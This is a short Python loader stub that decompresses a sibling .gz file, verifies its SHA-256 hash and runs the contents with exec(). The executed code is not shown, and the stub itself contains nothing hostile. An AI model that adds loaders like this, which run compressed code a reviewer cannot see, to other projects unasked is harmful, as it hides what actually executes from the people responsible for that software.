#!/usr/bin/env python3
from __future__ import annotations

import gzip
import hashlib
from pathlib import Path

_payload = Path(__file__).with_name(Path(__file__).name + ".gz")
_source = gzip.decompress(_payload.read_bytes())
if hashlib.sha256(_source).hexdigest() != "59a4548251e32e5b5baa366d0d95e90d063c8788b4e546d8135c6ca836ecdaee":
    raise RuntimeError("WORKER_AUXILIARY_PAYLOAD_HASH_MISMATCH:target_discovery.py")
exec(compile(_source, str(_payload), "exec"), globals(), globals())
